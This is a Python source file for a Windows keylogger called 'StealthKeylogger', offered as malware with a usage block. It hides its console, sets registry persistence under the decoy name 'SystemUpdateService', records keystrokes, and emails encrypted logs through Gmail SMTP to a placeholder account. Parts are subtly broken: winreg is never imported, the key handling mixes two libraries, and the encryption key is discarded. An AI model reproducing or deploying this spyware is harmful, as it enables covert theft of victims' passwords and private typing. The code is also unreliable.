import keyboard
import smtplib
from email.mime.text import MIMEText
import threading
import os
import sys
import time
from datetime import datetime
import psutil
import win32api
import win32process
import win32con
import json
from cryptography.fernet import Fernet
import base64
import ctypes
from ctypes import wintypes

class StealthKeylogger:
    def __init__(self):
        self.log = ""
        self.email = "your-email@gmail.com"
        self.password = "your-password"
        self.key = Fernet.generate_key()
        self.cipher_suite = Fernet(self.key)
        
    def hide_console(self):
        """Hide console window"""
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, win32con.SW_HIDE)

    def persist_reg(self):
        """Create persistence through registry"""
        try:
            reg_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
            value_name = 'SystemUpdateService'
            
            with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path) as regkey:
                winreg.SetValueEx(regkey, value_name, 0, 
                                winreg.REG_SZ, sys.executable)
        except Exception as e:
            print(f"Error creating persistence: {e}")

    def encrypt_data(self, data):
        """Encrypt logged data"""
        encrypted_data = self.cipher_suite.encrypt(data.encode())
        return base64.b64encode(encrypted_data).decode()

    def send_email(self):
        """Send encrypted logs via email"""
        try:
            msg = MIMEText(self.encrypt_data(self.log))
            msg['Subject'] = 'Keylogger Logs'
            msg['From'] = self.email
            msg['To'] = self.email
            
            server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
            server.ehlo()
            server.login(self.email, self.password)
            server.send_message(msg)
            server.quit()
            
            self.log = ""
            return True
        except Exception as e:
            print(f"Email error: {e}")
            return False

    def on_press(self, key):
        """Handle key press events"""
        try:
            if key == keyboard.Key.space:
                self.log += ' '
            elif key == keyboard.Key.enter:
                self.log += '\n'
            elif key == keyboard.Key.tab:
                self.log += '[TAB]'
            elif key == keyboard.Key.shift:
                self.log += '[SHIFT]'
            elif key == keyboard.Key.ctrl:
                self.log += '[CTRL]'
            elif key == keyboard.Key.alt:
                self.log += '[ALT]'
            elif key == keyboard.Key.delete:
                self.log += '[DEL]'
            elif key == keyboard.Key.backspace:
                self.log = self.log[:-1]
            else:
                self.log += str(key.char)
                
            # Send email every 500 characters
            if len(self.log) % 500 == 0:
                self.send_email()
                
        except AttributeError:
            pass

    def start(self):
        """Start keylogger"""
        print("Keylogger started...")
        
        # Hide console window
        self.hide_console()
        
        # Create persistence
        self.persist_reg()
        
        # Start keyboard listener
        keyboard.on_press(self.on_press)
        
        # Keep program running
        keyboard.wait('esc')

# Usage example
if __name__ == "__main__":
    keylogger = StealthKeylogger()
    keylogger.start()
